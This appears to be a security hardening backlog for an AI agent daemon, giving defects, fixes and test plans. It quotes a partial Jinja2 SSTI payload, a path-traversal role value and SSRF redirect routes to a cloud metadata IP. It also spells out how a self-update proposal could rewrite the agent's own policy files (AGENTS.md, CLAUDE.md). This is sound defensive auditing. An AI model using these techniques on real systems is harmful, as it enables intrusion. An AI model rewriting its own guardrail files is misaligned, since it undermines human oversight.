# Hardening backlog — turnkey designs (2026-07-10)

Line-anchored, adversarially-reviewed designs for OPEN hardening items surfaced
during the 2026-07-10 audit+design pass. Each entry: the confirmed defect
(file:line), the fix, and a test plan. Companion to
[WAVE_C_DESIGNS_2026-07-10](WAVE_C_DESIGNS_2026-07-10.md) /
[WAVE_C_ADDENDUM_2026-07-10](WAVE_C_ADDENDUM_2026-07-10.md). Full agent write-ups
live in the session task outputs; this doc is the durable, reviewable summary.

## H-RGSEARCH — confine + bound `rg_search` (MED, LATENT)

**Status:** latent — `code_intelligence/rg_search.py` has **zero live callers**
(`CodeSearch` in `search.py:14` does not call it; not wrapped as an MCP tool).
Preemptive hardening of the primitive so a future MCP/agent wrapper inherits a
fail-closed default.

**Defects:** (a) search root **unconfined** — `search(query, root=".")` forwards
`root` verbatim into argv at `rg_search.py:129/199` (`argv += ["--", query, root]`);
an absolute `/` or `../../..` root recurses anywhere the process can read.
(b) output **unbounded** — `subprocess.run(..., capture_output=True)` at
`rg_search.py:202-208` buffers all stdout; no `--max-count`/`--max-columns`/
`--max-filesize`, no cap on parsed `RgMatch` count.
Already-safe: argv-not-shell (`--` guard at :129, `_SAFE_FLAGS` allowlist
:116-128), timeout present (:28, :209-211).

**Fix:** reuse `security/sanitize.py::confine_path(candidate, root)` (:81,
realpath-joins + `commonpath` escape check, fail-closed → `None`). Add
`workspace_root` param to `search()`; `base = workspace_root or os.getcwd()`;
`confined = confine_path(root, base)`; on `None` return
`RgResult(available=False, error="search root outside workspace")`; pass the
**resolved** `confined` into argv (closes TOCTOU). Add rg flags
`--max-columns=4096 --max-columns-preview --max-filesize=10M`. Python-side
backstop caps: `MAX_STDOUT_BYTES=16MiB` (truncate captured stdout),
`MAX_MATCHES=1000` (slice parsed matches), new `RgResult.truncated: bool`.

**Tests** (`tests/unit/test_rg_search.py`): root `/etc` and `../../..` refused;
symlink-escape refused (realpath); in-workspace search still matches; match/byte
caps enforced + `truncated=True`; `build_argv` contains the bound flags;
argv-is-list/dash-guarded regression.

## H-RATELIMIT — admin API body-size cap + rate limit (MED, OPEN)

**Defect:** the daemon FastAPI admin surface has **no** rate limiter and **no**
body-size cap. Only middleware is `auth_and_stats_middleware` (`daemon.py:2468`);
app built at `daemon.py:2344` with no `add_middleware`. Server stack
(gunicorn+UvicornWorker, `worker/gunicorn_conf.py:8`) sets no
`limit_request_line`/body cap, so the app-level cap is load-bearing. A proven
cap+limiter already exists but only guards the **separate** ingest surface
(`receiver/router.py:117-154` `_TokenBucket`/`_RateLimiter`, `:219-243`
`_read_capped_body`), carved out of the PSK gate via `_RECEIVER_PREFIXES`
(`daemon.py:2446`) — it does not protect `/api/*`,`/admin/*`.

**Fix:** new `security/rate_limit.py` promoting the receiver's token-bucket
primitive to a shared, IP-keyable module + a **bounded LRU** (`max_tracked_keys`,
`OrderedDict.popitem(last=False)` eviction) so an attacker spraying distinct
keys can't grow the dict unbounded (a gap the receiver's own limiter has, safe
there because tokens are operator-issued). `threading.Lock` critical section is
pure arithmetic (never awaits) → safe from async middleware without an executor
hop. Pure `check_content_length(header, max_bytes)` helper for unit-testable
413/400 decisions. Wire by **extending the existing** `auth_and_stats_middleware`
(not a 2nd `@app.middleware` — Starlette insert/reverse ordering is error-prone),
inserted after the stats bump (`daemon.py:2470`) and **before** the PSK compare,
so a flood is rejected before the constant-time auth cost. Exempt
`_is_public(...)` reads + `_RECEIVER_PREFIXES` (already independently limited).
Config: `RateLimitConfig` on `UserConfig` (`config/user_config.py:190`), default
ON, conservative limits (10 rps / 20 burst / 10 MiB body / 10k keys), env
overrides free via `GLUDD_RATE_LIMIT__*` (`env_nested_delimiter="__"`).

**Residual (document, don't over-claim):** the Content-Length precheck fully
covers the realistic attack (honest oversized body). Byte-accurate capping of a
**chunked/no-Content-Length** body inside a blanket `@app.middleware("http")`
needs ASGI `receive`-patching (version-fragile) — defer to a per-endpoint
`_read_capped_body`-style helper on any admin endpoint found to accept unbounded
chunked uploads. State this gap explicitly.

**Tests:** `test_rate_limit.py` (pure: burst-then-deny, refill over mocked
monotonic, thread-safety no-double-spend, LRU eviction at max keys,
check_content_length matrix); `test_daemon_rate_limit.py` (ASGI: 413 oversized
Content-Length, 400 bad header, burst→429 with parseable Retry-After, healthz
exempt, ingest paths not double-limited, disabled-via-config serves all,
asyncio-concurrency no over-accept).

## H-DAST — dynamic scan slice

Full design in [DAST_INTEGRATION_SLICE.md](DAST_INTEGRATION_SLICE.md). Key
correction: `host_is_blocked` is the **wrong** primary gate for DAST (it denies
loopback/localhost — the usual scan target); use an operator-trusted target
allowlist as primary gate + a non-overridable metadata/RFC-1918 hard-deny reusing
`ssrf.py` `BLOCKED_HOST_NAMES`/`BLOCKED_METADATA_IPS`, and a mandatory
`{TARGET_URL}` placeholder so a target repo can't smuggle a scan URL via
`project.yml` (mirrors `runner.py:64-67` `_SECRET_NAME_RE` untrusted-input
precedent). `dast` is already an anticipated check name (`project_runner/
profile.py:53`) but fully unwired.

## H-WORKERBCAST — `worker_broadcast.py` dict-mutation-during-iteration (M2, LATENT)

**Status:** latent — `register`/`unregister`/`heartbeat`/`cleanup_stale` have
**zero call sites** in `src/` (no "register worker" route; `routers/reload.py`
exposes only `/admin/workers/ping` and `GET /admin/workers`). Not currently
triggerable; defense-in-depth that also unblocks future worker-registration
wiring. Say so in the commit message.

**Defect:** all three broadcast loops iterate the **live** dict
`self._workers` (`worker_broadcast.py:52`) directly — `broadcast_reload` (:139),
`broadcast_model_update` (:212), `ping_all` (:273) — while `register` (:100),
`unregister` (:103), `cleanup_stale` (:117) change its size → potential
`RuntimeError: dictionary changed size during iteration`. No lock exists.

**Fix:** `threading.Lock` (NOT asyncio.Lock — the broadcast loops run in
`asyncio.to_thread` workers, e.g. `routers/reload.py:102/236`, and
`broadcast_model_update` runs on the loop via `gateway.py:1697`; asyncio.Lock is
not thread-safe and can't be acquired from a worker thread). Guard all
mutators + `heartbeat` value-write; in each of the 3 loops take
`workers = list(self._workers.values())` **under the lock**, release, then do the
slow `httpx` I/O over the snapshot outside the lock (mirrors the *pattern* at
`event_loop/loop.py:474-494`, with the thread-appropriate primitive).

**Tests** (`tests/reload/test_worker_broadcast_concurrency.py`): ~500 https
workers (register()'s SSRF guard rejects http/loopback), stubbed slow `httpx`,
a mutator thread hammering register/unregister during 20× `broadcast_reload` →
assert no exception (pre-fix raises); snapshot-time members each receive exactly
one message; parametrize across all 3 methods; optional lock-released-across-I/O
overlap test.

## H-SELFUPD-TOCTOU — self_update apply-path symlink/anchor bugs (F2+F3, CONFIRMED)

**F2 — `self_update/safe_writer.py` parent-dir symlink TOCTOU.** `_confine`
(:190-217) does one `resolve()` (:205) + `relative_to` check (:207) returning a
plain `Path`; `write()` then does the real syscalls later by path string —
`mkstemp(dir=str(target.parent))` (:119-123), `os.replace(tmp, target)` (:129) —
re-walking the live tree. An attacker swapping `target.parent` (or an ancestor)
for a symlink outside `workspace_root` between check and rename gets the write
redirected. (The final component isn't the exposure — `rename` doesn't follow a
symlink at the leaf; the *parent* dir is.)
**Fix:** openat-style walk from an `O_DIRECTORY` fd on the (trusted, pre-resolved
at :57) `workspace_root`, opening each segment with
`O_DIRECTORY|O_NOFOLLOW, dir_fd=current`; create temp via
`os.open(name, O_CREAT|O_EXCL|O_WRONLY, 0o600, dir_fd=parent_fd)` and rename via
`os.rename(tmp, target.name, src_dir_fd=parent_fd, dst_dir_fd=parent_fd)`. Apply
the same to the pre-write read (:115) and `_restore` (:160-188). **Fail closed**
(raise, never fall back to the path-based version) if `os.supports_dir_fd`/
`O_NOFOLLOW` unavailable.

**F3 — `self_update/applier.py:158` cwd-anchored resolve.** `_first_protected`
(:133-187) does `Path(path).resolve()` at :158 — cwd-relative, not anchored to
`workspace_root` — and is called (`apply()` :305) with raw `target_paths`, while
`_resolve_confined` (:190-224, correct: `(root/decoded).resolve()` :218) already
produced root-anchored `resolved_paths`. If cwd ≠ workspace_root, the deny-list
checks a *different file* than what's written → a protected path can slip past.
**Fix:** thread the already-anchored `resolved_paths` into `_first_protected`
(`resolved_lowered = resolved_paths[i].as_posix().lower()`), never bare
`Path(path).resolve()`; keep the fail-closed `except → return path`.

**Tests:** symlinked-parent swap rejected / write stays in-workspace; relative
target with a protected marker denied **invariant to process cwd**; legit
in-workspace write still succeeds (dir_fd rewrite regression); platform-fallback
fails closed when `os.supports_dir_fd` is patched off.

## H-ACCOUNTING — blocking git subprocess + non-finite ledger values (C18, CONFIRMED)

**Defects:** (a) Blocking git subprocess on the async loop — `routers/facts.py:286`
`_accounting_facet` (async, awaited from `api_facts` :442) calls
`accountant.account_for` (:302) / `account_all` (:305) directly on the loop;
`account_for` (`accounting/ledger.py:105-159`) calls `loc_provider` (:125) →
`routers/accounting.py:34-73` `_project_loc_changed` runs blocking
`subprocess.run(["git","-C",repo,"diff","HEAD","--numstat"], timeout=15)`
(:48-54) → up to 15s/project loop stall.
(c) No isfinite guards — `ledger.py:108-118`: `usd_spent=sum(float(...))` (NaN/Inf
poisons the sum, and Starlette's JSONResponse emits invalid bare `NaN`/`Infinity`
tokens, RFC-8259-invalid), `tokens_used=sum(int(...))` (`int(nan)` raises
`ValueError`, `int(inf)` raises `OverflowError`). The `points` int at
`ledger.py:142` is likewise unguarded.

**Fix:** wrap both `account_for`/`account_all` calls in
`await asyncio.to_thread(...)` (asyncio already imported, caller already async) —
mirrors `routers/accounting.py:243-261`, which already does this for its own
endpoint. Add `import math`; add a per-record `_finite_float` helper (NaN/Inf/
garbage→`0.0`, logged) and `_finite_nonneg_int` helper (finite + non-negative,
else `0`); apply to `usd_spent`, `tokens_used`, and `points` (`ledger.py:142`).
This protects both `/api/facts` and `/api/accounting` — the latter lacks a
catch-all handler and would 500 without the guard.

**Tests:** NaN cost doesn't poison the sum; Inf clamped; `json.dumps(asdict(record),
allow_nan=False)` doesn't raise; NaN/Inf tokens don't 500 the endpoint; negative
tokens coerce to 0; happy-path (all-finite) unchanged; offload spy asserts
`account_for`/`account_all` run off the main event-loop thread (not on it).

## H-PERM-NET — `_intersect_constraints` silently widens net constraints (CONFIRMED)

**Defect:** `security/permissions.py:539-549` `_intersect_constraints`, net-constraint
branch: when side A constrains `allowed_ports`/`allowed_hosts` and side B omits
the key (`bset` = empty), `aset & bset` = ∅, so `if inter:` drops the key entirely
→ the constraint is silently removed. Absent means unconstrained everywhere
(confirmed against `_constraints_narrower` :596-611 and the sandbox enforcers —
`macos_seatbelt.py:101-112` / `linux_apparmor.py:60-64` both treat empty `hosts`
as allow-all-egress). Net effect: intersecting a constrained side with an
unconstrained side *widens* the merged policy instead of narrowing it.

**Fix:** per-key 3-way merge — both sides unconstrained → omit the key (stays
unconstrained); one side constrained, other absent → adopt the constrained
side's set (do NOT widen away); both sides constrained → set-intersect, and if
the intersection is empty, return `None` for the whole constraint (disjoint sets
→ drop the capability, preserving fail-closed). Use `a.get(key) or None` (empty
list treated as absent, matching `_constraints_narrower`'s convention).
`_constraints_narrower` is already correct — reference only, do not modify it.

**Tests** (extend `tests/unit/test_permissions.py::TestIntersectNetSecretRegression`):
the direct repro — intersecting `{allowed_ports:[80,443]}` with
`{allowed_hosts:[example.com]}` produces a result with **both** keys present, not
widened/empty (fails on current code); ports are set-intersected when both sides
constrain them; disjoint ports drop the capability entirely; both-sides-
unconstrained `allowed_hosts` stays absent (not spuriously populated).

## H-CONNECTOR — DNS-rebind TOCTOU + missing response caps (C23, 2 HIGH residuals)

**Defect:** DNS-rebind TOCTOU confirmed in `connectors/nomad.py` (validate-time
resolve `_guard_ssrf`:137 → `resolved_host_is_blocked`:110 is resolution #1;
connect-time resolve `_urllib_transport`:87 hands the raw hostname to httpx,
which performs resolution #2) and in `connectors/cilium_hubble.py`
(`_guard_url`:156 is resolution #1; `_http_get`:178 is resolution #2). Root
cause: the validated IP is discarded and the transport re-resolves the name, so
an attacker can flip DNS between the two lookups (public IP at validation,
`169.254.169.254` at connect). `connectors/okta.py` does **not** have this defect
(it never resolves DNS itself); its relevant lesson is host-pinning of
server-supplied next-URLs (:136-149), a different mechanism. Separately, ~47
connector fetch sites have no response-size cap, and 4 connectors are missing
`follow_redirects=False`: `azure_resource_graph.py:240`, `elastic_apm.py:76`,
`pyroscope.py:78`, `openshift.py:82`.

**Fix:** new `security/ssrf.py::resolve_and_pin(host, *, port, timeout) ->
PinnedTarget(host, ip, port)` — DNS-performing, so it belongs to the same
opt-in/bounded-thread/fail-closed category as the existing
`resolved_host_is_blocked` (intentionally **not** added to
`host_is_blocked`/`is_url_blocked`, which stay DNS-free). Resolves **once**,
rejects if **any** resolved address is blocked, and returns the vetted IP.
Connect via the httpx URL's host rewritten to the pinned IP, plus an explicit
`Host:` header and `extensions={"sni_hostname": host}` (preserves SNI, avoids a
3rd resolution). Plus a new `security/http_fetch.py::guarded_get(...)` composing
`is_url_blocked` + `resolve_and_pin` + no-redirect + a `Content-Length` precheck
+ a **streamed** read that aborts once past `max_bytes` (10MB default) +
credential redaction. Each connector fetch site already has a
`_default_transport` DI seam, so the ~47 sites adopt `guarded_get` incrementally
rather than in one sweep. Also add the 4 missing `follow_redirects=False`.
`podman`/`docker_engine` (unix sockets) are out of scope — no DNS involved.

**Tests:** a `FlipResolver` stub returns a public IP on call #1 and
`169.254.169.254` on call #2 → assert the resolver is called exactly **once**
and the transport connects to the pinned IP, never the re-resolved name (the old
code path resolves twice and would connect to the metadata IP); blocked-on-call-
#1 raises `SSRFError` fail-closed, and `health()` surfaces `ok:false` rather than
raising; size cap enforced via `Content-Length` precheck (body never read) and
via streamed-abort when no `Content-Length` is present; redaction scrubs
`Authorization`/`X-Nomad-Token`/`token=` from error messages; a 302 response
toward the metadata IP is not followed.

## C22-SSTI — bare Jinja2 `Environment` allows project-shadowed template RCE (CRITICAL, ✅ FIXED 2026-07-10)

**STATUS: FIXED this session (uncommitted in the working tree at time of
writing; verify via `tests/unit/test_prompt_registry_ssti.py`).** All cited
sites now construct `SandboxedEnvironment`, not bare `Environment` —
`prompts/registry.py` (import + `__init__` + `refresh()`), `event_loop/loop.py`
`_resolve_prompt_text_static`, and (defense-in-depth) `routers/render.py`.
Verified: `test_prompt_registry_ssti.py` 4 passed, `test_prompts.py` 10 passed,
`test_render_security.py` 4 passed, `make typecheck` clean (595 files). A
repo-wide sweep confirms zero bare `jinja2.Environment`/`Template` remain in
`src/`. The defect description below is retained as the historical record of what
was fixed. **Non-blocking follow-up:** `review/reviewer.py:113` calls
`registry.render` with no surrounding `try/except` — a project shadowing that
exact template name would now raise `SecurityError` (a clean crash of
`review_return`, strictly safer than the prior RCE) rather than the caught→`None`
pattern; wrap it for parity.

**Defect (historical — now fixed):** a bare `jinja2.Environment` rendered untrusted, project-shadowable
template content at `prompts/registry.py:15` (import), `:38` (`__init__`),
`:119` (`refresh()`), and at `event_loop/loop.py:192-194`
(`_resolve_prompt_text_static`, which renders a project-controlled
`project_templates_dir` file directly). Exploit chain: the daemon builds
`<project>/.gludd/templates` into `extra_template_dirs`
(`daemon.py:178,1175-1196`); `_make_loader` puts extra dirs **first**, and
`refresh()`'s first-name-wins lookup means a project-supplied
`implementation.md.j2` **shadows** the global template of the same name →
`{{''.__class__.__mro__[1].__subclasses__()...}}` in that file is RCE on the
daemon host at the next dispatch. Already-correct, leave alone:
`dispatch/variable_store.py`, `ansible/templating.py`, `skills/renderer.py` all
already use `SandboxedEnvironment`. Out of scope (package-shipped templates, not
project-shadowed — follow-up ticket): `routers/render.py:36,70`.

**Fix:** swap the 2 sites to `from jinja2.sandbox import SandboxedEnvironment` —
a drop-in subclass with identical kwargs/API that renders legitimate templates
byte-identically and raises `SecurityError` on unsafe attribute/callable access
instead of executing it. Fail behavior: `registry.render` propagates
`SecurityError` up to `loop.py:206-215`'s existing `try/except`, which returns
`None` (inert, no RCE); the `loop.py` project-template path already has its own
surrounding `try/except`, so it's caught there too.

**Tests** (`tests/unit/test_prompt_registry_ssti.py`): parametrized SSTI payloads
raise `SecurityError`; a `popen`-based payload is blocked with no execution; a
project-shadow disk path (via `tmp_path` + `refresh()`) raises; the `loop.py`
path returns `None` on the malicious template; normal `{{var}}` interpolation,
loops, and filters render identically to before (regression guard).

## Round-2 additions (2026-07-10 sweeps)

### H-FETCH-CAPS (MED, CONFIRMED) — unbounded network fetches outside the hardened set

**Defect:** several fetch sites read the whole response with no byte cap:
`git_automation/issue_ingestor.py:99-100` (`json.loads(resp.read())` on GitHub
issue payloads); `routers/web_search.py:60-84` (`urlopen(...).read()` on
DuckDuckGo HTML, plus 3× `re.DOTALL findall` over the full body — also a
quadratic-scan risk); `reload/worker_broadcast.py:169-181,242-254,291-297`
(httpx, no stream/cap, LOW-MED, SSRF-guarded already); `connectors/
docker_engine.py:134-148` + `podman.py` (`while True: sock.recv(65536)`, no
accumulation cap, LOW, local-socket only).

**Fix:** route each through the existing capped-read pattern in
`retrieval/web.py` (`resp.read(_MAX_CONTENT_BYTES+1)` + truncate), or a shared
`guarded_get` (see H-CONNECTOR below). Highest value first: `web_search.py` +
`issue_ingestor.py` share the identical one-line fix.

### H-FILE-CAPS (MED, CONFIRMED) — unbounded whole-file reads of target-repo/attacker paths

**Defect:** jailed by location but not by size: `issue_sources/
csv_excel.py:110-116,193-196` (CSV branch `[list(r) for r in reader]` — distinct
from the already-fixed xlsx zip-bomb path); `planning/repo_map.py:139`
(`read_text()` × max_files=500 → LLM context); `retrieval/indexer.py:53`
(`read_text()`, MAX_CHUNK_CHARS bounds only apply *after* the full read);
`issue_sources/markdown_todo.py:90-92`; `project_runner/profile.py:128`
(`yaml.safe_load(read_text())` on target `project.yml`); `project_runner/
detect.py:84` (`json.loads(read_text())` on `package.json`).

**Fix:** shared `MAX_FILE_BYTES` helper doing an `os.path.getsize` precheck
before each read, fail-closed on oversize.

### H-TAR-BOMB (LOW, CONFIRMED) — bootstrap tar extraction has no decompressed-size/member cap

**Defect:** `filestore/bootstrap.py:314` `tarfile.open(...,"r:gz")` +
`extractfile().read()` — path traversal is already mitigated and compressed
size is capped in `download()`, but there is no cap on decompressed size or
member count. Gated behind pinned-sha256 + a hardcoded GitHub asset (lower
exploitability), but a supply-chain compromise of that asset would still zip-bomb.

**Fix:** cap cumulative decompressed bytes and member count during extraction,
fail closed on overflow.

**Tests (all three above):** oversized body/file/archive is rejected before
full materialization (mocked large content, not an actual multi-MB fixture);
happy-path unchanged; `web_search.py`/`issue_ingestor.py` share one regression
test since they share the fix.

### Informational (no fix scheduled)

`review/langgraph_consensus.py:169` / `consensus.py:47` — `num_agents`/
`max_rounds` are floor-clamped only, no upper clamp; latent, only
operator-config-sourced today (not request/LLM-controlled). `observability/
otel_bridge.py:64` hardcodes `OTLPSpanExporter(insecure=True)` — unrelated
insecure-TLS smell, not DoS. Confirmed CLEAN (no fix needed): `receiver/`
ingestion (8MiB cap + deque maxlen), pagination (`max_pages`), `mcp/catalog`
(2MB cap), no catastrophic-backtracking regexes found.

### H-WEBFETCH-REDIRECT (MED, fix-in-progress) — SSRF guard bypassable via redirect

**Defect:** `retrieval/web.py:105-110` `urlopen` auto-follows 3xx redirects;
`is_url_blocked` only validates the initial URL, so a public URL that 302s to
`169.254.169.254` bypasses the guard entirely.

**Fix:** install a no-follow redirect handler (mirror `issue_sources/
monday.py:64` `_NoRedirectHandler`), or re-validate the `Location` header
before following. Being applied to the main tree this session.

**Also confirmed:** `langchain/prompt_adapter.py:13` calls `registry.render`
with no surrounding `try/except` — a `SecurityError` (e.g. from the C22-SSTI
`SandboxedEnvironment` fix above) propagates uncaught. **Fix:** wrap in
`try/except SecurityError` mirroring `event_loop/loop.py:206-215`'s caught→`None`
pattern.

**Tests:** a 302 toward the metadata IP is not followed (redirect-handler unit
test); a malicious-template `SecurityError` from `prompt_adapter.py`'s
`registry.render` call is caught, not propagated.

## Round-3 additions (2026-07-10 deep-audit sweeps)

### H-SELFMOD-DENYLIST (HIGH, CONFIRMED — exploit chain re-verified 2026-07-10 night-3) — policy docs missing from self-mod deny-lists

**Defect:** `AGENTS.md`/`CLAUDE.md`/`TASKS.md` are in **neither** self-modification
protected-path deny-list: `security/capability_lattice.py:41-75`
(`PROTECTED_FILE_STEMS`/`PROTECTED_FILE_SUBSTRINGS`/`PROTECTED_PATH_SEGMENTS`) and
`self_update/applier.py:41-64` (`PROTECTED_PATH_MARKERS`) both omit them, though
AGENTS.md is the repo's stated policy authority. `self_update/apply.py` hard-denies
`settings.json` but not these. Reachable: CONFIG-tier auto-apply
(`auto_apply_config=True`) of a markdown rewrite needs no approval token, and
pipelines like `planning/debt_applier.py:137-141` merge LLM-supplied paths into
`plan.target_files`.

**Confirmed full exploit chain (2026-07-10 night-3 re-audit):** a self-improve
proposal with `kind="config"`/`"yaml"` and `target_paths=["AGENTS.md"]` passes
`applier.py`'s capability gate (:264-287), the workspace-confinement gate
(:289-302, `_resolve_confined`), and `_first_protected` (:305-311) — no marker in
`PROTECTED_PATH_MARKERS` (:41-64) matches `agents.md`/`claude.md`/`tasks.md` —
then reaches the YAML branch (:324-351), where `yaml.safe_load(change_content)`
(:326) succeeds on ordinary prose (Markdown text commonly parses as a valid YAML
scalar/mapping) and the file is written via `self._writer.write(...)` (:351).
This lets the CONFIG-tier self-update surface rewrite the very policy files that
constrain the agent — a guardrail-integrity bypass, not merely a missing-marker
gap.

**Fix:** add `AGENTS.md`/`CLAUDE.md`/`TASKS.md` (+ `.md` policy docs generally,
and any `.opencode`/`.claude` guardrail files not already covered) to all
self-mod deny-lists (stem + exact-name match) — see H-DENYLIST-DRIFT below for
why "all" currently means 3 independently-drifting lists rather than one.

**Tests:** `is_protected_path("AGENTS.md")`/`("CLAUDE.md")` == `True`; an
`apply_plan` targeting them is refused; a `kind="config"` proposal with
`target_paths=["AGENTS.md"]` and prose `change_content` that would otherwise
parse as YAML is denied by the protected-path check before ever reaching the
YAML branch (regression guard on the exact chain above).

### H-ENGINE-WRITE-GUARD (MED, CONFIRMED) — engine write path has no deny-list backstop

**Defect:** `execution/engine.py` `_write_file` (:833) / `_apply_unified_diff`
(:886) never consult the protected-path deny-list (no import of
`capability_lattice`); they rely solely on `_resolve_in_workspace` (:808-831)
workspace-confinement. If a project's `workspace_path` is ever gludd's own repo
(dogfood/self-host, or the `self_improve.py:246` `Path.cwd()` fallback), there's
no second line of defense at the write site.

**Fix:** call `check_self_modification`/`is_protected_path` in `_write_file`/
`_apply_unified_diff` before writing (defense-in-depth even inside the workspace
jail).

**Tests:** an engine write targeting `.claude/` or `AGENTS.md` within a
repo-root workspace is refused.

### H-RELOAD-BATCH-F1 (LATENT, CONFIRMED) — hot-reload batch path bypasses single-module guards

**Defect:** `reload/hot_reloader.py:391-413` `reload_changed_modules` batch path
executes self-improve-workspace file bytes via `shutil.copy2`+
`importlib.reload`/`import_module`, bypassing the single-module path's
protected-path/authenticity/rollback guards (docstring falsely claims it
delegates to `reload_code_module`). Only caller `harness.apply_self_improvement`
has no production caller (live `/admin/self-improve/apply` uses the guarded
`reload_code_module`).

**Fix (before it's wired):** route each batch per-file swap through
`check_self_modification` + authenticity + rollback (or actually call
`reload_code_module` per file as the docstring claims).

**Tests:** batch reload of a protected/forged file is refused/rolled back.

### H-WEBRETRIEVE-DOS (MED-HIGH, CONFIRMED) — sync fetch + unclamped timeout stalls the event loop

**Defect:** `mcp/builtins.py` `_web_retrieve` calls `fetch_web_page`
synchronously inline (no `asyncio.to_thread`, unlike `run_project_check`) and
`timeout_seconds` (:209-213) is `int()`-cast with no min/max clamp → a
model-chosen large timeout on a slow endpoint stalls the entire event loop
(`ToolCallLoop`'s `asyncio.wait_for` can't preempt a non-yielding sync call).

**Fix:** wrap `fetch_web_page` in `asyncio.to_thread` and clamp
`timeout_seconds` to a sane max (e.g. 60s).

**Tests:** a large `timeout_seconds` is clamped; the fetch runs off the loop
(assert thread offload).

### H-WEBRETRIEVE-REBIND (MED, CONFIRMED) — fetch_web_page vulnerable to DNS rebind

**Defect:** `retrieval/web.py` `fetch_web_page` uses only the no-DNS
`is_url_blocked`; a hostname resolving at connect time to
loopback/RFC-1918/169.254.169.254 bypasses it (the
`GLUDD_WEB_FETCH_ALLOWED_DOMAINS` allowlist matches the hostname string, not the
resolved IP). Ties to H-CONNECTOR's `resolve_and_pin`.

**Fix:** resolve-and-pin the host (reuse the planned
`security/ssrf.py::resolve_and_pin`) or call `resolved_host_is_blocked` before
fetch.

**Tests:** a `FlipResolver` public→metadata rejected.

**Re-confirmed (Round-12, 2026-07-10)**, with exact current citations:
`web.py:17` imports only `is_url_blocked` (never `resolved_host_is_blocked`,
`security/ssrf.py:173-234`); `web.py:121` is the sole guard call; `web.py:152`
`opener.open(req, ...)` performs the connecting DNS resolution with no
re-check against the already-vetted result — confirms the gap end-to-end,
including that no TTL-flip timing is even required (an ordinary A record
pointing at an internal IP suffices). No new defect surfaced on the rebind
finding itself; see H-SSRF-NUMERIC-IP (Round-12, below) for a distinct,
newly-identified sibling gap in the same `host_is_blocked` primitive
(non-dotted-decimal/octal/hex IP literal encodings), surfaced during this
re-audit.

### H-MCP-ARGCAP (MED, CONFIRMED) — tool-call args decoded with no size cap

**Defect:** `execution/tool_loop.py:243-255` `json.loads` of model tool-call
args has no byte/size cap (only post-hoc token budget); outbound model→tool
payloads unbounded (`client.py:116-126`/`transport.py:463-469` → subprocess
stdin), asymmetric with inbound's 64KB `StreamReader` limit.

**Fix:** cap decoded arg byte size (reject oversized tool-call args).

**Tests:** oversized args rejected.

### H-OTEL-TLS (MED, CONFIRMED) — OTLP exporter hardcodes insecure transport

**Defect:** `observability/otel_bridge.py:64` hardcodes
`OTLPSpanExporter(insecure=True)`.

**Fix:** `ObservabilityConfig.otel_insecure: bool = False` (secure default) +
`otel_ca_cert` path; emit insecure only on opt-in; else secure system-root TLS
(or CA creds). Wire `daemon.py:2013-2016`.

**Tests:** default→secure, opt-in→insecure.

### H-DB-TENANT-SCOPING (MED-HIGH, BROAD, CONFIRMED) — ~15 repository methods unscoped by project_id

**Defect:** ~15 repository methods in `db/repository.py` return rows without a
`project_id` filter despite the model having the column: unscoped
`get_by_id`/`list` (`TaskReturnRepository.get_by_id:621`,
`AuditEventRepository.list_by_entity:807`,
`QueueRepository.get_by_name:1174`/`list_all:1179`,
`AgentMessageRepository.get_by_id:1429`, `RemediationActionRepository.get:2221`,
`BenchmarkRepository.get_model_scores:1029`/`list_recent:1042`,
`FeatureRepository.get_by_name:1698`) + weak optional-default-`None`
(`TaskReturnRepository.work_summary`/`history_summary`/`claim_unreviewed`,
`AgentMessageRepository.inbox`/`unread_counts`,
`SpendRepository.list_since`/`total_since`,
`RoleRunRepository.count_by_role`/`list_all`,
`RemediationActionRepository.list_since`) + 2 write-side
(`FeatureRepository.set_status:1659` breaks its own `.scoped()` invariant;
`ProjectRelationshipRepository.remove:1400` deletes by id with no project
check). Correct pattern exists: `TodoRepository.scoped()`/`_resolve_pid`.

**Fix:** generalize `.scoped()` — zero-caller methods → required `project_id`
(fail-closed like `AuditEventRepository.create`); weak-default → required/
raise-if-`None`; write-side → add `project_id` to guarded WHERE.

**Tests:** cross-tenant `get_by_id`/`set_status`/`remove` for a foreign project
returns `None`/refuses; same-tenant works.

## Round-4 additions (2026-07-10 night sweeps)

### H-STREAM-TRAVERSAL (HIGH, CONFIRMED) — `/admin/stream/dispatch` RoleCloner path-traversal

**Defect:** `routers/stream.py:36` declares `role: str` with only min/max length
`Field` constraints, no character restriction; `:84` builds
`role_dir = cloner.collection_root/"roles"/req.role` and checks only
`.is_dir()`. `stream/__init__.py:62-69` `RoleCloner.clone` re-derives
`src = collection_root/"roles"/role_name`, checks only `src.is_dir()`, then
`shutil.copytree(src, clone_path)` with **no** realpath/`relative_to`/
`commonpath` confinement anywhere in the chain. `role="../../../../etc"` copies
an arbitrary directory into `/tmp/gludd-stream-clones/` and, if
`wait_for_completion`, runs `ansible-playbook` in it and returns stdout
(disclosure). PSK-gated, but any PSK holder can trigger it. This stands out —
every other write path in the codebase (skills, diffs, model-writes, filestore,
self-update) is realpath+containment-jailed; this one isn't.

**Fix:** reject any `role` containing `/`, `\`, or `..`; additionally resolve
`src.resolve()` and require `relative_to((collection_root/"roles").resolve())`
before `copytree` (mirror `execution/engine.py::_resolve_in_workspace` /
`self_update/applier.py::_resolve_confined`).

**Tests:** `role="../.."` (and a literal path-separator role) rejected/404,
`copytree` never called; a legitimate role still clones successfully.

### H-MERGE-WRITER-SYMLINK (HIGH, PLAUSIBLE, def-in-depth)

**Defect:** `pipeline/daemon_adapters.py:171-199` merge-writer joins `rel`
(sourced from `git diff --name-only`) via `os.path.join` and opens it with a
plain `open(path, "w")` — no realpath/containment check, unlike
`self_update/applier.py::_resolve_confined`. Git itself blocks a literal `..`
component in tracked paths, so the realistic trigger is a symlink already
committed in the repo pointing outside the checkout, not a raw traversal
string.

**Fix:** realpath the resolved write target and require
`relative_to(repo_path)` before opening for write, matching the confinement
pattern used elsewhere for merge/apply writes.

**Tests:** a tracked symlink pointing outside `repo_path` is refused as a merge
target; a normal in-repo path still writes.

### H-RELOAD-BATCH-TRAVERSAL (HIGH, PLAUSIBLE, low exploitability)

**Defect:** `reload/hot_reloader.py:367-374` batch reload path builds
`workspace_path = repo_root/norm` with no realpath/containment check, unlike
the single-module reload path which does a sha256 check plus
`_resolve_confined`. Combines with the H-RELOAD-BATCH-F1 finding already
recorded above (Round-3) — the batch path is unwired in production today, but
both gaps live in the same code and should be closed together.

**Fix:** apply the same realpath + `_resolve_confined` containment check used
by the single-module path to each `norm` entry in the batch path before any
file operation.

**Tests:** a batch entry containing `..` or resolving outside `repo_root` is
refused; a legitimate batch of in-repo modules still reloads.

